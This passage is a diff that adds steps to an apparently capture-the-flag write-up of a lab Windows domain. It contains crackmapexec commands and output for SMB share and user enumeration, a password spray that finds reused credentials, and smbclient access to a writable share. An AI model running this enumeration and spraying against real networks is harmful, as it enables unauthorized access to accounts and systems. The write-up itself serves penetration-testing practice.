@@ -237,6 +237,109 @@ sudo ./kerbrute_linux_amd64 userenum --dc 10.10.11.187 -d flight.htb -o kerbrute
 
 Used the credentials `svc_apache:S@Ss!K@*t13` and enumerated SMB shares with `crackmapexec`:
 
+```bash
+crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
+
+SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.10.11.187    445    G0               [+] Enumerated shares
+SMB         10.10.11.187    445    G0               Share           Permissions     Remark
+SMB         10.10.11.187    445    G0               -----           -----------     ------
+SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
+SMB         10.10.11.187    445    G0               C$                              Default share
+SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
+SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.10.11.187    445    G0               Shared          READ            
+SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.10.11.187    445    G0               Users           READ            
+SMB         10.10.11.187    445    G0               Web             READ
+```
+
+Enumerated users:
+
+```bash
+crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute
+
+SMB         10.10.11.187    445    G0               498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               500: flight\Administrator (SidTypeUser)
+SMB         10.10.11.187    445    G0               501: flight\Guest (SidTypeUser)
+SMB         10.10.11.187    445    G0               502: flight\krbtgt (SidTypeUser)
+SMB         10.10.11.187    445    G0               512: flight\Domain Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               513: flight\Domain Users (SidTypeGroup)
+SMB         10.10.11.187    445    G0               514: flight\Domain Guests (SidTypeGroup)
+SMB         10.10.11.187    445    G0               515: flight\Domain Computers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               516: flight\Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               517: flight\Cert Publishers (SidTypeAlias)
+SMB         10.10.11.187    445    G0               518: flight\Schema Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               519: flight\Enterprise Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               520: flight\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.11.187    445    G0               521: flight\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               522: flight\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.11.187    445    G0               525: flight\Protected Users (SidTypeGroup)
+SMB         10.10.11.187    445    G0               526: flight\Key Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               527: flight\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.11.187    445    G0               553: flight\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.11.187    445    G0               571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.187    445    G0               572: flight\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1000: flight\Access-Denied Assistance Users (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1001: flight\G0$ (SidTypeUser)
+SMB         10.10.11.187    445    G0               1102: flight\DnsAdmins (SidTypeAlias)
+SMB         10.10.11.187    445    G0               1103: flight\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.11.187    445    G0               1602: flight\S.Moon (SidTypeUser)
+SMB         10.10.11.187    445    G0               1603: flight\R.Cold (SidTypeUser)
+SMB         10.10.11.187    445    G0               1604: flight\G.Lors (SidTypeUser)
+SMB         10.10.11.187    445    G0               1605: flight\L.Kein (SidTypeUser)
+SMB         10.10.11.187    445    G0               1606: flight\M.Gold (SidTypeUser)
+SMB         10.10.11.187    445    G0               1607: flight\C.Bum (SidTypeUser)
+SMB         10.10.11.187    445    G0               1608: flight\W.Walker (SidTypeUser)
+SMB         10.10.11.187    445    G0               1609: flight\I.Francis (SidTypeUser)
+SMB         10.10.11.187    445    G0               1610: flight\D.Truff (SidTypeUser)
+SMB         10.10.11.187    445    G0               1611: flight\V.Stevens (SidTypeUser)
+SMB         10.10.11.187    445    G0               1612: flight\svc_apache (SidTypeUser)
+SMB         10.10.11.187    445    G0               1613: flight\O.Possum (SidTypeUser)
+SMB         10.10.11.187    445    G0               1614: flight\WebDevs (SidTypeGroup)
+```
+
+Performed a password spray attack with crackmapexec:
+
+```bash
+crackmapexec smb flight.htb -u userlist -p 'S@Ss!K@*t13'
+
+SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+```
+
+Found a new set of credentials: `S.Moon:S@Ss!K@*t13`
+
+Enumerating shares shows that we have we have WRITE access to the `Shared` share.
+
+```bash
+crackmapexec smb 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
+
+SMB         10.10.11.187    445    G0               Share           Permissions     Remark
+SMB         10.10.11.187    445    G0               -----           -----------     ------
+SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
+SMB         10.10.11.187    445    G0               C$                              Default share
+SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
+SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
+SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.10.11.187    445    G0               Users           READ            
+SMB         10.10.11.187    445    G0               Web             READ
+```
+
+Accessing `Shared` share shows that it is empty:
+
+```bash
+smbclient //10.10.11.187/Shared --user 'S.Moon' -password 'S@Ss!K@*t13'
+Password for [WORKGROUP\S.Moon]:
+Try "help" to get a list of possible commands.
+
+smb: \> dir
+  .                                   D        0  Sun Aug  4 00:35:56 2024
+  ..                                  D        0  Sun Aug  4 00:35:56 2024
+```
+
+
 
 
 
